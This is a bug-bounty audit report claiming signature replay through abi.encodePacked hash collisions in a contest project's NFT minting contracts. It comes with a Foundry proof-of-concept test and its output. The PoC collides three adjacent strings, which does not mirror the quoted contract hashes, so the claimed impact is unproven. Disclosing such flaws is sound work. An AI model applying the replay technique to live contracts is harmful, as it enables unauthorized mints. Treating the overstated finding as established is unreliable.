# 57594 sc medium signature collision from abi encodepacked adjacent strings enables unauthorized nft actions mint uri abuse&#x20;

**Submitted on Oct 27th 2025 at 11:33:02 UTC by @manvi for** [**Audit Comp | Belong**](https://immunefi.com/audit-competition/audit-comp-belong)

* **Report ID:** #57594
* **Report Type:** Smart Contract
* **Report severity:** Medium
* **Target:** <https://github.com/immunefi-team/audit-comp-belong/blob/main/contracts/v2/utils/SignatureVerifier.sol>
* **Impacts:**
  * Unauthorized minting of NFTs
  * Unintended alteration of what the NFT represents (e.g. token URI, payload, artistic content)
  * Griefing (e.g. no profit motive for an attacker, but damage to the users or the protocol)

## Description

### Brief / Intro

Multiple contracts build signed digests with `keccak256(abi.encodePacked(...))` where adjacent dynamic strings are concatenated. This is unsafe because different tuples of dynamic inputs can collapse to the same bytes, producing the same hash and hence validating the same signature. In production, a signature created for one intent (e.g. minting for URI X) can be replayed for a different intent (e.g. URI Y) that encodes to the same packed bytes, leading to unauthorized mints or metadata changes.

### Vulnerability Details

The pattern appears wherever `keccak256(abi.encodePacked(...))` is used with dynamic types that can sit next to each other or be mixed in a way that allows ambiguity. From the repository:

* contracts/v1/utils/AddressHelper.sol
  * Example: `keccak256(abi.encodePacked(receiver, tokenId, tokenUri, price, block.chainid))`
* contracts/v2/utils/SignatureVerifier.sol
  * Examples:
    * `keccak256(abi.encodePacked(venueInfo.venue, venueInfo.referralCode, venueInfo.uri, block.chainid))`
    * `keccak256(abi.encodePacked(receiver, params.tokenId, params.tokenUri, params.price, block.chainid))`

In each case, at least one dynamic string (`tokenUri`, `referralCode`, `uri`) is packed alongside other fields. With `abi.encodePacked`, dynamic types are concatenated without length delimiters, so distinct tuples can produce the same byte string.

Example intuition:

abi.encodePacked("ab", "c") -> 0x616263\
abi.encodePacked("a", "bc") -> 0x616263

Both hash to the same keccak256, so a signature over one verifies for the other.

When a signer signs `ethHash = keccak256("\x19Ethereum Signed Message:\n32" || packedHash)`, any different tuple that collides at the packed level will also validate via `SignatureCheckerLib.isValidSignatureNow(...)`. This breaks intent binding and allows signature re-use for unintended data.

### How this can be exploited

1. Signer creates a valid signature for tuple T1 (e.g. `(receiver, tokenId, tokenUri="ab", price, chainId)`).
2. Attacker crafts T2 (e.g. with `tokenUri="a" + "b..."` pattern or adjusted parameters) such that `abi.encodePacked(T1) == abi.encodePacked(T2)`.
3. Because both encode to the same bytes, `keccak256(abi.encodePacked(T1)) == keccak256(abi.encodePacked(T2))`, so the same signature verifies for T2.
4. The protocol accepts T2's parameters (e.g., attacker-controlled tokenUri / referral parameters), enabling unauthorized mint/metadata effects.

### Impact Details

* Unauthorized minting of NFTs (primary impact)
* Unintended alteration of what the NFT represents (token URI / content)

## References

* Solidity docs - ABI Packed Mode & collision warning: <https://docs.soliditylang.org/en/latest/abi-spec.html#abi-packed-mode>

Repo files using `abi.encodePacked(...)` with dynamic strings:

* contracts/v1/utils/AddressHelper.sol
* contracts/v2/utils/SignatureVerifier.sol

## Proof of Concept

I wrote a PoC that reproduces the core issue (signature re-use across colliding packed inputs). It mirrors the on-chain pattern and shows that a signature for one tuple validates for a different tuple that produces the same packed hash.

File: poc/SinglePackedStringCollision.t.sol

PoC content:

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.27;

import "forge-std/Test.sol";
import {SignatureCheckerLib} from    "solady/src/utils/SignatureCheckerLib.sol";
import {ECDSA} from "solady/src/utils/ECDSA.sol";

contract SinglePackedStringCollision is Test {
    using ECDSA for bytes32;

    // Vulnerable pattern: adjacent dynamic types (strings) in encodePacked
    function _hashPacked(string memory a, string memory b, string memory c) internal pure returns (bytes32) {
        return keccak256(abi.encodePacked(a, b, c));
    }

    function test_SignaturePackedCollision_All() public {
        // Two *different* tuples that encodePacked to the *same* bytes ("abc")
        string memory a1 = "ab"; string memory b1 = "c";  string memory c1 = "";
        string memory a2 = "a";  string memory b2 = "bc"; string memory c2 = "";

        bytes32 h1 = _hashPacked(a1, b1, c1);
        bytes32 h2 = _hashPacked(a2, b2, c2);
        assertEq(h1, h2, "hashes must match (same packed bytes)");

        (address signer, uint256 pk) = makeAddrAndKey("signer");

        // Sign the first message
        bytes32 ethHash1 = h1.toEthSignedMessageHash();
        (uint8 v, bytes32 r, bytes32 s) = vm.sign(pk, ethHash1);
        bytes memory sig = abi.encodePacked(r, s, v);

        // Self-check: signature verifies for the first tuple
        assertTrue(SignatureCheckerLib.isValidSignatureNow(signer, ethHash1, sig), "self-check");

        // Because h1 == h2, the SAME signature also verifies for the second tuple
        bytes32 ethHash2 = h2.toEthSignedMessageHash();
        assertTrue(
            SignatureCheckerLib.isValidSignatureNow(signer, ethHash2, sig),
            "collision: reused sig must verify"
        );
    }
}
```

What the PoC does:

* Builds two different parameter tuples that hash to the same value when using `keccak256(abi.encodePacked(...))` with adjacent string fields.
* Signs the first tuple with a test key (ECDSA / `SignatureCheckerLib`).
* Reuses that same signature against the second tuple and shows it passes verification.

How to run the PoC:

```
forge clean
forge test -vvv --match-path poc/SinglePackedStringCollision.t.sol
```

<details>

<summary>Console log (from reporter)</summary>

$ forge clean\
forge test -vvv --match-path poc/SinglePackedStringCollision.t.sol\
\[⠊] Compiling...\
\[⠰] Compiling 27 files with Solc 0.8.27\
\[⠔] Solc 0.8.27 finished in 2.35s\
Compiler run successful!

Ran 1 test for poc/SinglePackedStringCollision.t.sol:SinglePackedStringCollision\
\[PASS] test\_SignaturePackedCollision\_All() (gas: 16996)\
Suite result: ok. 1 passed; 0 failed; 0 skipped; finished in 67.88ms (61.51ms CPU time)

Ran 1 test suite in 293.73ms (67.88ms CPU time): 1 tests passed, 0 failed, 0 skipped (1 total tests)

</details>

## What the PoC proves

`abi.encodePacked` with adjacent dynamic types (e.g., `string,string`) is ambiguous and can cause hash collisions. Any signature check or authorization that relies on that packed hash can be bypassed: a signature for one intent can be replayed for a different intent.

In this repo, the pattern appears in v1 AddressHelper.sol and v2 SignatureVerifier.sol, so flows that trust those hashes are vulnerable to unauthorized actions unless fixed (e.g., switch to `abi.encode` / EIP-712 or length-prefix/separators).
